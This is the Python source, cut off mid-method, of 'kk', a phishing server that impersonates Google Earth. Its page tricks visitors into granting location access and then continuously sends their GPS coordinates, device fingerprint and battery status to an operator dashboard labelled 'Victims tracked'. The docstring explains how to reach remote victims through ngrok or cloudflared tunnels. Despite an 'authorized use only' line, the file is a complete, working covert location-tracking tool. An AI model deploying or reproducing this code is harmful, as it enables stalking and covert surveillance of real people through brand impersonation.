#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
kk v1.2.0 — single-file HTML5 geolocation tracking server
(kk-style social-engineering tool, stdlib only, no dependencies)

Authorized use only: this is a social-engineering / phishing assessment tool
for testing how easily users grant location access to lookalike pages.

How it works
------------
1. Victim opens the served page: a "Google Earth" style 3D globe with
   animated flight routes, clouds, atmosphere glow and a starfield.
2. The browser asks the victim for location permission (HTML5 geolocation).
3. If allowed, GPS coordinates are POSTed back to /location continuously
   (watchPosition) while the page is open. The camera flies to the victim's
   position and drops a red pin on the globe.
4. Coordinates appear live on the dashboard at /logs with an embedded map.
5. If GOOGLE_MAPS_API_KEY is set, street addresses are resolved via the
   Google Geocoding API.

Usage
-----
    python3 kk.py -p 8080
    GOOGLE_MAPS_API_KEY=xxxx python3 kk.py -p 8443

IMPORTANT: the Geolocation API only works in a "secure context"
(HTTPS) or on localhost. To test against a remote victim, expose the
server over HTTPS:

    ngrok http 8080            -> send the https://xxxx.ngrok.io link
    cloudflared tunnel --url http://localhost:8080

NOTE: the victim page loads three.js + Earth textures from public CDNs
(cdnjs / unpkg). If the CDN is unreachable a fallback screen is shown,
but geolocation capture still works.
"""

import argparse
import json
import sys
import threading
import time
import urllib.parse
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

VERSION = "1.2.0"
START_TIME = time.time()

# ---------------------------------------------------------------------------
# Storage
# ---------------------------------------------------------------------------
DATA = []                # list of captured records (one per victim IP, live-updated)
DATA_LOCK = threading.Lock()
GOOGLE_KEY = ""

# ANSI colors for console output
R, G, Y, C, B, X = "\033[0m", "\033[92m", "\033[93m", "\033[96m", "\033[1m", "\033[91m"


# ---------------------------------------------------------------------------
# Victim page — Google Earth style 3D globe that requests geolocation
# ---------------------------------------------------------------------------
PAGE_VICTIM = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Google Earth</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;background:#04070f;font-family:Roboto,'Segoe UI',Arial,sans-serif}
#globe{position:fixed;inset:0;z-index:1}
#globe canvas{display:block}
.topbar{position:fixed;top:0;left:0;right:0;height:60px;display:flex;align-items:center;gap:10px;padding:0 16px;z-index:30;background:linear-gradient(180deg,rgba(4,7,15,.8),rgba(4,7,15,0));color:#fff}
.hamburger{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:20px;color:#e8eaed}
.hamburger:hover{background:rgba(255,255,255,.12)}
.logo{display:flex;align-items:center;gap:9px;font-size:19px;font-weight:500;letter-spacing:.2px;white-space:nowrap}
.logo .icon{width:27px;height:27px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#7ec3ff,#1a73e8 58%,#0b3d91);box-shadow:0 0 12px rgba(66,133,244,.7),inset -3px -4px 8px rgba(0,0,0,.25);position:relative;overflow:hidden}
.logo .icon:after{content:'';position:absolute;left:-3px;top:4px;width:16px;height:8px;border-radius:50%;background:rgba(255,255,255,.35);transform:rotate(-18deg)}
.logo b{font-weight:600}
.logo .earth{color:#aecbfa}
.search{flex:1;max-width:430px;margin-left:14px;position:relative}
.search input{width:100%;height:40px;border:1px solid rgba(255,255,255,.16);border-radius:20px;background:rgba(255,255,255,.09);color:#fff;padding:0 16px 0 40px;font-size:14px;outline:none}
.search input::placeholder{color:rgba(255,255,255,.55)}
.search input:focus{background:rgba(255,255,255,.14);border-color:rgba(255,255,255,.35)}
.search svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:rgba(255,255,255,.7)}
.credit{position:fixed;right:14px;bottom:10px;z-index:20;color:rgba(255,255,255,.5);font-size:11px;letter-spacing:.2px}
.overlay{position:fixed;inset:0;z-index:50;display:flex;align-items:center;justify-content:center;background:rgba(4,7,15,.55);transition:opacity .5s}
.overlay.hidden{opacity:0;pointer-events:none}
.card{background:rgba(13,20,35,.92);border:1px solid rgba(255,255,255,.12);border-radius:14px;padding:28px 34px;text-align:center;max-width:420px;box-shadow:0 12px 40px rgba(0,0,0,.6);backdrop-filter:blur(8px)}
.spinner{width:44px;height:44px;border:4px solid rgba(255,255,255,.15);border-top-color:#8ab4f8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}
.card .title{font-size:18px;color:#fff;font-weight:500;margin-bottom:8px}
.card .sub{font-size:13px;color:#bdc1c6;line-height:1.5}
.btn{margin-top:18px;display:inline-block;background:#1a73e8;color:#fff;border:none;border-radius:22px;padding:11px 26px;font-size:14px;cursor:pointer;font-weight:500}
.btn:hover{background:#1765cc}
.chip{position:fixed;left:50%;bottom:26px;transform:translateX(-50%);background:rgba(255,255,255,.96);color:#202124;border-radius:24px;padding:11px 22px;font-size:14px;box-shadow:0 6px 20px rgba(0,0,0,.55);z-index:40;display:none;white-space:nowrap}
.chip b{color:#1a73e8}
.chip .mono{font-family:Consolas,Menlo,monospace;font-size:12px;color:#5f6368}
#fallback{position:fixed;inset:0;z-index:60;display:none;align-items:center;justify-content:center;text-align:center;color:#e8eaed;background:radial-gradient(ellipse at center,#0b1526 0%,#04070f 70%)}
#fallback .inner{max-width:420px;padding:20px}
#fallback h2{font-size:18px;font-weight:500;margin-bottom:10px}
#fallback p{font-size:13px;color:#bdc1c6;line-height:1.5}
</style>
</head>
<body>
<div id="globe"></div>
<div class="topbar">
  <div class="hamburger">&#9776;</div>
  <div class="logo"><span class="icon"></span><span>Google&nbsp;<b class="earth">Earth</b></span></div>
  <div class="search">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
    <input type="text" placeholder="Search Google Earth">
  </div>
</div>
<div class="credit">Imagery &copy;2026 NASA, TerraMetrics &nbsp;|&nbsp; Map data &copy;2026</div>
<div class="overlay" id="overlay">
  <div class="card">
    <div class="spinner" id="spinner"></div>
    <div class="title" id="ovtitle">Loading Google Earth...</div>
    <div class="sub" id="ovsub">Preparing the 3D globe view...</div>
    <button class="btn" id="retry" style="display:none" onclick="location.reload()">Allow location access</button>
  </div>
</div>
<div class="chip" id="chip"><b>You are here</b> <span class="mono" id="chipcoords"></span></div>
<div id="fallback">
  <div class="inner">
    <h2>3D view could not be initialized</h2>
    <p>Location services are still active. Please allow location access to continue.</p>
    <button class="btn" onclick="location.reload()">Try again</button>
  </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<script>
(function(){
  var R = 5;
  var located = false, watchId = null;
  var scene = null, renderer = null, camera = null;
  var globeGroup = null, clouds = null, routeGroup = null;
  var routes = [], cityV = [], hq = null;
  var pinSprite = null, ringSprite = null, pinScale = 0;
  var autoRotate = true, camFlight = null;
  var clockMs = 0, last = 0;

  // ---------------- geolocation payload (same contract as before) ----------------
  var payload = {
    lat: null, lon: null, acc: null, alt: null, heading: null, speed: null,
    ts: Date.now(),
    ua: navigator.userAgent,
    lang: navigator.language,
    platform: navigator.platform || '',
    screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
    conn: (navigator.connection || {}).effectiveType || '',
    battery: 'unknown',
    error: null,
    handler: 'html5'
  };
  if (navigator.getBattery) {
    try {
      navigator.getBattery().then(function(b){
        payload.battery = Math.round(b.level * 100) + '% (charging: ' + b.charging + ')';
      });
    } catch (e) {}
  }
  function post(o) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/location', true);
      x.setRequestHeader('Content-Type', 'application/json');
      x.send(JSON.stringify(o));
    } catch (e) {}
  }

  // ---------------- ui ----------------
  function showDenied() {
    if (located) return;
    document.getElementById('ovtitle').textContent = 'Location access required';
    document.getElementById('ovsub').textContent = 'To see your position on the globe, click the button below and choose "Allow".';
    document.getElementById('retry').style.display = 'inline-block';
    var sp = document.getElementById('spinner');
    if (sp) sp.style.display = 'none';
  }
  function chipShow(lat, lon) {
    document.getElementById('chipcoords').textContent = lat.toFixed(5) + ', ' + lon.toFixed(5);
    document.getElementById('chip').style.display = 'block';
  }

  // ---------------- geometry helpers ----------------
  function latLonToVec3(lat, lon, radius) {
    var phi = (90 - lat) * Math.PI / 180;
    var theta = (lon + 180) * Math.PI / 180;
    return new THREE.Vector3(
      -radius * Math.sin(phi) * Math.cos(theta),
      radius * Math.cos(phi),
      radius * Math.sin(phi) * Math.sin(theta)
    );
  }
  function lerpColor(h1, h2, t) {
    var a = new THREE.Color(h1), b = new THREE.Color(h2);
    return { r: a.r + (b.r - a.r) * t, g: a.g + (b.g - a.g) * t, b: a.b + (b.b - a.b) * t };
  }
  function arcPoints(a, b, h) {
    var seg = 48, pts = [];
    for (var i = 0; i <= seg; i++) {
      var t = i / seg;
      var v = a.clone().lerp(b, t).normalize();
      v.multiplyScalar(R + h * Math.sin(t * Math.PI));
      pts.push(v);
    }
    return pts;
  }
  function pointOnArc(r, t) {
    var idx = t * (r.pts.length - 1);
    var i0 = Math.floor(idx), f = idx - i0;
    return r.pts[i0].clone().lerp(r.pts[Math.min(i0 + 1, r.pts.length - 1)], f);
  }
  function makeLabel(text) {
    var cv = document.createElement('canvas');
    cv.width = 512; cv.height = 96;
    var c = cv.getContext('2d');
    c.font = 'bold 44px Arial';
    c.textAlign = 'center';
    c.textBaseline = 'middle';
    c.shadowColor = 'rgba(0,0,0,0.85)';
    c.shadowBlur = 10;
    c.fillStyle = 'rgba(255,255,255,0.95)';
    c.fillText(text, 256, 48);
    var s = new THREE.Sprite(new THREE.SpriteMaterial({
      map: new THREE.CanvasTexture(cv), transparent: true, depthWrite: false, opacity: 0.9
    }));
    s.scale.set(2.6, 0.5, 1);
    return s;
  }
  function makePinCanvas() {
    var cv = document.createElement('canvas');
    cv.width = 128; cv.height = 128;
    var c = cv.getContext('2d');
    var g = c.createLinearGradient(0, 0, 128, 128);
    g.addColorStop(0, '#ff5a5f');
    g.addColorStop(1, '#d11a2a');
    c.fillStyle = g;
    c.beginPath(); c.arc(64, 50, 28, 0, Math.PI * 2); c.fill();
    c.beginPath();
    c.moveTo(64, 122);
    c.lineTo(44, 70);
    c.quadraticCurveTo(38, 46, 64, 40);
    c.quadraticCurveTo(90, 46, 84, 70);
    c.closePath();
    c.fill();
    c.fillStyle = '#fff';
    c.beginPath(); c.arc(64, 58, 11, 0, Math.PI * 2); c.fill();
    return cv;
  }
  function makeRingCanvas() {
    var cv = document.createElement('canvas');
    cv.width = 256; cv.height = 256;
    var c = cv.getContext('2d');
    c.strokeStyle = 'rgba(255,255,255,0.85)';
    c.lineWidth = 3;
    c.beginPath(); c.arc(128, 128, 96, 0, Math.PI * 2); c.stroke();
    return cv;
  }

  // ---------------- world data ----------------
  var CITIES = [
    ['New York',    40.7128,  -74.0060], ['London',    51.5074,  -0.1278],
    ['Tokyo',       35.6762,  139.6503], ['Sydney',    -33.8688, 151.2093],
    ['Mumbai',      19.0760,   72.8777], ['Sao Paulo', -23.5505, -46.6333],
    ['Cairo',       30.0444,   31.2357], ['Moscow',     55.7558,  37.6173],
    ['Dubai',       25.2048,   55.2708], ['Singapore',   1.3521, 103.8198],
    ['Lagos',        6.5244,    3.3792], ['Mexico City',19.4326, -99.1332],
    ['Paris',       48.8566,    2.3522], ['Beijing',    39.9042, 116.4074],
    ['Bangkok',     13.7563,  100.5018], ['Nairobi',    -1.2921,  36.8219]
  ];
  var HQ = [37.4220, -122.0841];   // Googleplex, Mountain View

  // ---------------- build scene ----------------
  function init() {
    scene = new THREE.Scene();
    camera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000);
    camera.position.set(0, 1.2, 14);

    renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
    renderer.setPixelRatio(Math.min(window.devicePixelRatio || 1, 2));
    renderer.setSize(window.innerWidth, window.innerHeight);
    document.getElementById('globe').appendChild(renderer.domElement);

    // stars
    var starGeo = new THREE.BufferGeometry();
    var n = 1400, pos = new Float32Array(n * 3), col = new Float32Array(n * 3);
    for (var i = 0; i < n; i++) {
      pos[i * 3]     = (Math.random() - 0.5) * 500;
      pos[i * 3 + 1] = (Math.random() - 0.5) * 500;
      pos[i * 3 + 2] = (Math.random() - 0.5) * 500;
      var b = 0.5 + Math.random() * 0.5;
      col[i * 3] = b; col[i * 3 + 1] = b; col[i * 3 + 2] = b + 0.1;
    }
    starGeo.setAttribute('position', new THREE.BufferAttribute(pos, 3));
    starGeo.setAttribute('color', new THREE.BufferAttribute(col, 3));
    scene.add(new THREE.Points(starGeo,
      new THREE.PointsMaterial({ size: 0.25, vertexColors: true, transparent: true, opacity: 0.9 })));

    // earth
    var tex = THREE.ImageUtils.loadTexture(
      'https://unpkg.com/three-globe/example/img/earth-blue-marble.jpg');
    globeGroup = new THREE.Group();
    var earth = new THREE.Mesh(new THREE.SphereGeometry(R, 48, 48),
      new THREE.MeshPhongMaterial({ map: tex, shininess: 8 }));
    globeGroup.add(earth);
    globeGroup.rotation.y = 4.2;

    // clouds
    clouds = new THREE.Mesh(new THREE.SphereGeometry(R * 1.008, 48, 48),
      new THREE.MeshPhongMaterial({
        map: THREE.ImageUtils.loadTexture(
          'https://unpkg.com/three-globe/example/img/earth-water.png'),
        transparent: true, opacity: 0.5, depthWrite: false
      }));
    globeGroup.add(clouds);

    // atmosphere glow
    var atmo = new THREE.Mesh(
      new THREE.SphereGeometry(R * 1.02, 48, 48),
      new THREE.MeshBasicMaterial({ color: 0x3a7bd5, transparent: true, opacity: 0.09, side: THREE.BackSide })
    );
    globeGroup.add(atmo);
    scene.add(globeGroup);
    scene.add(new THREE.AmbientLight(0xffffff, 0.45));
    var sun = new THREE.DirectionalLight(0xffffff, 1.05);
    sun.position.set(6, 4, 8);
    scene.add(sun);

    // city markers + labels
    routeGroup = new THREE.Group();
    scene.add(routeGroup);
    CITIES.forEach(function(cd) {
      var v = latLonToVec3(cd[1], cd[2], R * 1.002);
      var m = new THREE.Mesh(
        new THREE.SphereGeometry(0.055, 12, 12),
        new THREE.MeshBasicMaterial({ color: 0x7fd4ff })
      );
      m.position.copy(v);
      routeGroup.add(m);
      cityV.push(v);
      var lbl = makeLabel(cd[0]);
      lbl.position.copy(v.clone().multiplyScalar(1.16));
      routeGroup.add(lbl);
    });
    hq = latLonToVec3(HQ[0], HQ[1], R * 1.002);
    var hm = new THREE.Mesh(
      new THREE.SphereGeometry(0.07, 12, 12),
      new THREE.MeshBasicMaterial({ color: 0xffd166 })
    );
    hm.position.copy(hq);
    routeGroup.add(hm);
    var hlbl = makeLabel('Google HQ');
    hlbl.position.copy(hq.clone().multiplyScalar(1.16));
    routeGroup.add(hlbl);

    // flight routes: HQ <-> cities, arc height varies
    cityV.forEach(function(cv) {
      var arc = {
        pts: arcPoints(hq, cv, 0.6 + Math.random() * 0.9),
        t: Math.random(), speed: 0.12 + Math.random() * 0.18,
        color: lerpColor('#8ab4f8', '#7fffd4', Math.random()),
        plane: null
      };
      var g = new THREE.BufferGeometry().setFromPoints(arc.pts);
      var line = new THREE.Line(g, new THREE.LineBasicMaterial({
        color: new THREE.Color(arc.color), transparent: true, opacity: 0.28
      }));
      routeGroup.add(line);
      routes.push(arc);
    });
  }

  // ---------------- pin / victim marker ----------------
  function dropPin(lat, lon) {
    if (!pinSprite) {
      pinSprite = new THREE.Sprite(new THREE.SpriteMaterial({
        map: new THREE.CanvasTexture(makePinCanvas()),
        transparent: true, depthTest: false, depthWrite: false
      }));
      ringSprite = new THREE.Sprite(new THREE.SpriteMaterial({
        map: new THREE.CanvasTexture(makeRingCanvas()),
        transparent: true, opacity: 0.75, depthWrite: false
      }));
      globeGroup.add(pinSprite); globeGroup.add(ringSprite);
    }
    var v = latLonToVec3(lat, lon, R * 1.012);
    pinSprite.position.copy(v);
    ringSprite.position.copy(v);
    pinScale = 1;
  }

  // ---------------- camera fly ----------------
  function flyTo(lat, lon) {
    autoRotate = false;
    var target = latLonToVec3(lat, lon, R).normalize();
    camFlight = {
      fromPos: camera.position.clone(),
      toPos: target.clone().multiplyScalar(11),
      toLook: target.clone().multiplyScalar(R * 1.05),
      start: performance.now(),
      dur: 2200
    };
  }

  // ---------------- animation loop ----------------
  function animate(t) {
    requestAnimationFrame(animate);
    var dt = Math.min((t - (last || t)) / 1000, 0.1);
    last = t;
    clockMs += dt;

    if (autoRotate) globeGroup.rotation.y += dt * 0.06;

    // advance route planes
    routes.forEach(function(r) {
      r.t += dt * r.speed;
      if (r.t > 1) r.t -= 1;
      var p = pointOnArc(r, r.t);
      if (!r.plane) {
        r.plane = new THREE.Mesh(
          new THREE.SphereGeometry(0.05, 8, 8),
          new THREE.MeshBasicMaterial({ color: new THREE.Color(r.color) })
        );
        routeGroup.add(r.plane);
      }
      r.plane.position.copy(p);
    });

    // pin pulse
    if (pinSprite && pinScale > 0) {
      var s = 0.75 + Math.sin(clockMs * 3) * 0.08;
      pinSprite.scale.set(s * 0.55, s * 0.55, 1);
      ringSprite.scale.set(s * 1.5 + 0.4 * Math.sin(clockMs * 2), s * 1.5 + 0.4 * Math.sin(clockMs * 2), 1);
      ringSprite.material.opacity = 0.6 - 0.25 * Math.sin(clockMs * 2);
    }

    // camera flight
    if (camFlight) {
      var e = Math.min((performance.now() - camFlight.start) / camFlight.dur, 1);
      var k = e < 0.5 ? 2 * e * e : 1 - Math.pow(-2 * e + 2, 2) / 2; // easeInOut
      camera.position.lerpVectors(camFlight.fromPos, camFlight.toPos, k);
      camera.lookAt(camFlight.toLook);
      if (e >= 1) camFlight = null;
    } else {
      camera.lookAt(0, 0, 0);
    }

    // clouds drift slowly
    if (clouds) clouds.rotation.y += dt * 0.004;

    renderer.render(scene, camera);
  }

  // ---------------- resize ----------------
  window.addEventListener('resize', function() {
    if (!camera || !renderer) return;
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
  });

  // ---------------- geolocation glue ----------------
  function success(pos) {
    clearTimeout(fallbackTimer);
    payload.lat = pos.coords.latitude;
    payload.lon = pos.coords.longitude;
    payload.acc = pos.coords.accuracy;
    payload.alt = pos.coords.altitude;
    payload.heading = pos.coords.heading;
    payload.speed = pos.coords.speed;
    post(payload);
    located = true;
    document.getElementById('overlay').classList.add('hidden');
    chipShow(payload.lat, payload.lon);
    if (scene) {
      dropPin(payload.lat, payload.lon);
      flyTo(payload.lat, payload.lon);
    }
    if (watchId === null && navigator.geolocation && navigator.geolocation.watchPosition) {
      watchId = navigator.geolocation.watchPosition(success, denied, opts);
    }
  }
  function denied(err) {
    clearTimeout(fallbackTimer);
    payload.error = (err && err.message) ? err.message + ' (code ' + err.code + ')' : 'unknown error';
    post(payload);
    showDenied();
  }
  var opts = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
  var fallbackTimer = setTimeout(function() {
    payload.error = 'timeout (user did not respond to permission prompt)';
    post(payload);
    showDenied();
  }, 25000);

  // ---------------- boot ----------------
  function bootGeo() {
    document.getElementById('ovtitle').textContent = 'Determining your location...';
    document.getElementById('ovsub').textContent = 'Google Earth needs access to your location to show your position on the globe.';
    if (!navigator.geolocation) {
      payload.error = 'geolocation not supported by this browser';
      post(payload);
      showDenied();
    } else {
      navigator.geolocation.getCurrentPosition(success, denied, opts);
    }
  }
  function boot() {
    bootGeo();
    if (scene && renderer) requestAnimationFrame(animate);
  }

  if (typeof THREE === 'undefined') {
    document.getElementById('fallback').style.display = 'flex';
    document.getElementById('ovtitle').textContent = '3D view could not be initialized';
    document.getElementById('ovsub').textContent = 'Location services are still active. Allow access to continue.';
    document.getElementById('retry').style.display = 'inline-block';
    bootGeo();
  } else {
    try {
      init();
      boot();
    } catch (e) {
      document.getElementById('fallback').style.display = 'flex';
      bootGeo();
    }
  }
})();
</script>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# Dashboard page — live map + table of captured locations (satellite theme)
# ---------------------------------------------------------------------------
PAGE_DASH = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>kk - Live Location Dashboard</title>
<style>
*{box-sizing:border-box}
body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:radial-gradient(ellipse at 20% -10%,#0b1526 0%,#04070f 55%) fixed;color:#e8eaed;margin:0;padding:24px}
h1{font-size:22px;margin:0 0 4px;display:flex;align-items:center;gap:12px}
.gicon{width:24px;height:24px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#7ec3ff,#1a73e8 58%,#0b3d91);box-shadow:0 0 10px rgba(66,133,244,.7);display:inline-block}
.sub{color:#9aa0a6;font-size:13px;margin-bottom:18px}
.live{display:inline-flex;align-items:center;gap:6px;background:#1f2d1f;color:#81c995;border:1px solid #2e4a2e;border-radius:20px;padding:3px 10px;font-size:11px;font-weight:600;letter-spacing:.5px}
.live .dot{width:8px;height:8px;border-radius:50%;background:#81c995;animation:pulse 1.2s infinite}
@keyframes pulse{0%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}100%{opacity:1;transform:scale(1)}}
.layout{display:grid;grid-template-columns:minmax(0,1.15fr) minmax(0,1fr);gap:18px;align-items:start}
@media (max-width:1100px){.layout{grid-template-columns:1fr}}
.mapcard{background:rgba(13,20,35,.85);border:1px solid rgba(255,255,255,.12);border-radius:10px;overflow:hidden;backdrop-filter:blur(6px)}
.mapcard iframe{display:block;width:100%;height:520px;border:0;background:#dde3ea}
.mapinfo{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:12px 14px;flex-wrap:wrap}
.mapinfo .coords{font-family:Consolas,Menlo,monospace;font-size:13px;color:#bdc1c6}
.mapinfo .addr{color:#9aa0a6;font-size:12px;margin-top:2px}
.mapinfo a{color:#8ab4f8;text-decoration:none;font-size:13px;white-space:nowrap}
.mapinfo a:hover{text-decoration:underline}
.stats{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap}
.stat{background:rgba(13,20,35,.85);border:1px solid rgba(255,255,255,.12);border-radius:8px;padding:10px 14px;flex:1;min-width:100px}
.stat .v{font-size:20px;font-weight:600}
.stat .k{font-size:11px;color:#9aa0a6}
.toolbar{display:flex;gap:8px;margin-bottom:10px;align-items:center}
.btn{background:#2b3a55;color:#e8eaed;border:none;border-radius:6px;padding:7px 13px;cursor:pointer;font-size:12px}
.btn:hover{background:#36465f}
.btn.primary{background:#1a73e8}
.btn.primary:hover{background:#1765cc}
.tablewrap{max-height:520px;overflow-y:auto;border-radius:8px;border:1px solid rgba(255,255,255,.12);background:rgba(13,20,35,.85)}
table{width:100%;border-collapse:collapse;font-size:12px}
th,td{padding:8px 10px;text-align:left;border-bottom:1px solid #1c2533;white-space:nowrap}
th{background:rgba(35,39,49,.9);color:#9aa0a6;font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.5px;position:sticky;top:0;z-index:1}
tbody tr{cursor:pointer}
tbody tr:hover td{background:#182232}
tbody tr.sel td{background:#12233c;box-shadow:inset 3px 0 0 #1a73e8}
a{color:#8ab4f8;text-decoration:none}
.mono{font-family:Consolas,Menlo,monospace}
.empty{color:#5f6368;text-align:center;padding:30px;font-size:13px}
</style>
</head>
<body>
<h1><span class="gicon"></span> kk - Live Location Dashboard <span class="live"><span class="dot"></span>LIVE</span></h1>
<div class="sub">Victim locations appear on the map automatically. Click any row to inspect that capture. Page refreshes every 2 seconds.</div>
<div class="layout">
  <div class="mapcard">
    <iframe id="mapframe" src="https://maps.google.com/maps?q=0,0&z=2&output=embed" title="victim map"></iframe>
    <div class="mapinfo">
      <div>
        <div class="coords" id="mapcoords">No location captured yet</div>
        <div class="addr" id="mapaddr"></div>
      </div>
      <a id="mapopen" target="_blank" rel="noopener" style="display:none">Open in Google Maps &rarr;</a>
    </div>
  </div>
  <div>
    <div class="stats">
      <div class="stat"><div class="v" id="cnt">0</div><div class="k">Victims tracked</div></div>
      <div class="stat"><div class="v" id="ips">0</div><div class="k">Unique IPs</div></div>
      <div class="stat"><div class="v" id="up">0s</div><div class="k">Dashboard open</div></div>
    </div>
    <div class="toolbar">
      <button class="btn primary" id="followBtn" onclick="toggleFollow()">&#9679; Following latest</button>
      <button class="btn" onclick="clearLog()">Clear log</button>
    </div>
    <div class="tablewrap">
      <table>
        <thead><tr><th>#</th><th>Time (UTC)</th><th>IP</th><th>Latitude</th><th>Longitude</th><th>Acc</th><th>Device</th></tr></thead>
        <tbody id="rows"></tbody>
      </table>
      <div class="empty" id="empty">No captures yet. Send the victim link, wait for them to open it and click Allow.</div>
    </div>
  </div>
</div>
<script>
var rows = [];
var selected = null;   // row index shown on the map; null = follow latest (row 0)
var following = true;
var opened = Date.now();

function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];});}
function idx(){ return (following || selected == null || selected >= rows.length) ? 0 : selected; }

async function refresh(){
  try{
    rows = await (await fetch('/api/locations')).json();
  }catch(e){ return; }
  var tb = document.getElementById('rows');
  document.getElementById('empty').style.display = rows.length ? 'none' : 'block';
  document.getElementById('cnt').textContent = rows.length;
  document.getElementById('ips').textContent = new Set(rows.map(function(r){return r.ip;})).size;
  var cur = idx();
  tb.innerHTML = rows.map(function(r,i){
    var n = rows.length - i;
    var dev = [r.tz, r.conn, r.battery, r.platform].filter(Boolean).join(' &middot; ');
    var err = r.error ? ' <span style="color:#f28b82">(' + esc(r.error) + ')</span>' : '';
    return '<tr class="' + (i === cur ? 'sel' : '') + '" onclick="selectRow(' + i + ')">' +
      '<td class="mono">' + n + '</td>' +
      '<td class="mono">' + esc(r.recv_time) + '</td>' +
      '<td class="mono">' + esc(r.ip) + '</td>' +
      '<td class="mono">' + (r.lat != null ? r.lat.toFixed(6) : '&mdash;') + '</td>' +
      '<td class="mono">' + (r.lon != null ? r.lon.toFixed(6) : '&mdash;') + '</td>' +
      '<td>' + (r.acc != null ? Math.round(r.acc) + 'm' : '&mdash;') + '</td>' +
      '<td title="' + esc(r.ua || '') + '">' + esc(dev) + err + '</td></tr>';
  }).join('');
  updateMap();
}

function updateMap(){
  var f = document.getElementById('mapframe');
  var c = document.getElementById('mapcoords');
  var a = document.getElementById('mapaddr');
  var o = document.getElementById('mapopen');
  var r = rows[idx()];
  if (!r || r.lat == null){
    f.setAttribute('src', 'https://maps.google.com/maps?q=0,0&z=2&output=embed');
    c.textContent = (r && r.error) ? 'Location denied/error: ' + r.error : 'No location captured yet';
    a.textContent = '';
    o.style.display = 'none';
    return;
  }
  var src = 'https://maps.google.com/maps?q=' + r.lat + ',' + r.lon + '&z=16&output=embed';
  if (f.getAttribute('src') !== src) f.setAttribute('src', src);
  c.innerHTML = r.lat.toFixed(6) + ', ' + r.lon.toFixed(6) + ' &nbsp;(&plusmn;' + Math.round(r.acc || 0) + ' m)';
  a.textContent = r.address || '';
  o.href = 'https://www.google.com/maps?q=' + r.lat + ',' + r.lon;
  o.style.display = 'inline';
}

function selectRow(i){ following = false; selected = i; renderSel(); updateMap(); }
function toggleFollow(){ following = !following; selected = null; renderSel(); updateMap(); }
function renderSel(){
  document.getElementById('followBtn').textContent = following ? '\u25CF Following latest' : 'Click a row to inspect';
  var cur = idx();
  Array.prototype.forEach.call(document.querySelectorAll('#rows tr'), function(tr, i){
    tr.className = (i === cur) ? 'sel' : '';
  });
}
async function clearLog(){ await fetch('/api/clear', {method:'POST'}); rows = []; refresh(); }
setInterval(function(){
  document.getElementById('up').textContent = Math.floor((Date.now() - opened) / 1000) + 's';
}, 1000);
setInterval(refresh, 2000);
refresh();
</script>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# Console reporting
# ---------------------------------------------------------------------------
def _print_hit(rec, updating=False):
    line = "=" * 64
    tag = "[~] LOCATION UPDATED" if updating else "[+] LOCATION CAPTURED"
    print("\n" + G + line + X)
    print(G + tag + X)
    print("    Time     : " + rec.get("recv_time", "?"))
    print("    IP       : " + rec.get("ip", "?"))
    lat, lon = rec.get("lat"), rec.get("lon")
    if lat is not None and lon is not None:
        print("    Coords   : " + Y + "%s, %s" % (lat, lon) + X)
        print("    Accuracy : %s m" % (round(rec.get("acc") or 0)))
        print("    Map      : " + C + "https://www.google.com/maps?q=%s,%s" % (lat, lon) + X)
    else:
        print("    Coords   : " + X + "none (error: %s)" % rec.get("error", "unknown") + R)
    print("    UA       : " + (rec.get("ua") or "")[:90])
    print("    Device   : %s | %s | %s | %s" % (
        rec.get("tz", "-"), rec.get("conn", "-"), rec.get("battery", "-"), rec.get("platform", "-")))
    print(G + line + R)


def _reverse_geocode(rec):
    """Optional street-address resolution. Requires a Google Maps Geocoding API key."""
    try:
        qs = urllib.parse.urlencode({
            "latlng": "%s,%s" % (rec["lat"], rec["lon"]),
            "key": GOOGLE_KEY,
        })
        with urllib.request.urlopen(
            "https://maps.googleapis.com/maps/api/geocode/json?" + qs, timeout=10
        ) as resp:
            j = json.loads(resp.read().decode("utf-8", "replace"))
        if j.get("status") == "OK" and j.get("results"):
            rec["address"] = j["results"][0]["formatted_address"]
            print("  " + C + "[+] Address : " + R + rec["address"])
    except Exception as e:
        rec["address"] = "geocode failed: %s" % e


# ---------------------------------------------------------------------------
# HTTP server
# ---------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "kk/" + VERSION

    def log_message(self, fmt, *args):  # silence default request logging
        pass

    # ---- helpers ----
    def _send(self, code, body, ctype="text/html; charset=utf-8"):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
